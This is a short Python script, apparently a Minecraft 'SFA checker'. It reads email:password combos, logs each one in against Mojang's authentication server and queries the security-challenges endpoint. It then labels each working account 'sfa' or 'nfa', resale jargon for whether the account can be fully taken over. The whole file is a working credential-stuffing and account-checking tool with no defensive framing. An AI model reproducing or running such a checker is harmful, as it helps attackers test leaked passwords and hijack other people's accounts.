import requests
from requests import Session, exceptions
import json

sfa_url = 'https://api.mojang.com/user/security/challenges'
while True:
    combo = input("Combo: ")
    while ':' not in combo:
        combo = input("Enter the account details in email:password format: ")
    
    username = combo.split(':')[0]
    password = combo.split(':')[1]
    
    with requests.Session() as session:
        response = session.post("https://authserver.mojang.com/authenticate", json={ 'agent' : {"name" : "Minecraft", "version" : 1}, 'username': username, 'password': password})
        if response.status_code == 200:
            text = response.text
            if "Invalid credentials. Invalid username or password" in text:
                print(username + ' failed to login!\nPress enter to exit.')
                input()
            else:
                #by https://github.com/baum1810/sfa-checker
                data = response.json()
                uuid = data['selectedProfile']['id']
                token = data['accessToken']
                headers = {'Pragma': 'no-cache', "Authorization": f"Bearer {token}"}
    
                z = session.get(url=sfa_url, headers=headers).text
                if z == '[]':
                    print("sfa")
                else:
                    print("nfa")
    
                
        else:
            print("Something went wrong. Response status code: " + str(response.status_code))
